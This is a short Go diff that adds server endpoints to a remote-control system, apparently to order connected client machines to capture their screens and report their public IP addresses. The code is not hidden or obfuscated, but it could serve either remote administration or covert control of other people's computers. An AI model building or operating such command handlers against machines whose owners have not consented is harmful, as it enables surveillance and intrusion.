@@ -467,3 +467,47 @@ func handleFileDownload(c *gin.Context) {
 		}
 	}()
 }
+
+// handleScreenCapture handles POST /api/screen/capture
+func handleScreenCapture(c *gin.Context) {
+	var req struct {
+		ClientID   string  `json:"client_id" binding:"required"`
+		Format     string  `json:"format"`
+		Quality    float64 `json:"quality"`
+		DisplayIdx float64 `json:"display_index"`
+	}
+
+	if err := c.ShouldBindJSON(&req); err != nil {
+		c.JSON(400, gin.H{"error": err.Error()})
+		return
+	}
+
+	if req.Format == "" {
+		req.Format = "png"
+	}
+	if req.Quality == 0 {
+		req.Quality = 90
+	}
+
+	payload := map[string]interface{}{
+		"format":        req.Format,
+		"quality":       req.Quality,
+		"display_index": req.DisplayIdx,
+	}
+
+	sendFileCommand(c, "screen_capture", req.ClientID, payload)
+}
+
+// handleGetPublicIP handles POST /api/public-ip
+func handleGetPublicIP(c *gin.Context) {
+	var req struct {
+		ClientID string `json:"client_id" binding:"required"`
+	}
+
+	if err := c.ShouldBindJSON(&req); err != nil {
+		c.JSON(400, gin.H{"error": err.Error()})
+		return
+	}
+
+	sendFileCommand(c, "public_ip", req.ClientID, map[string]interface{}{})
+}
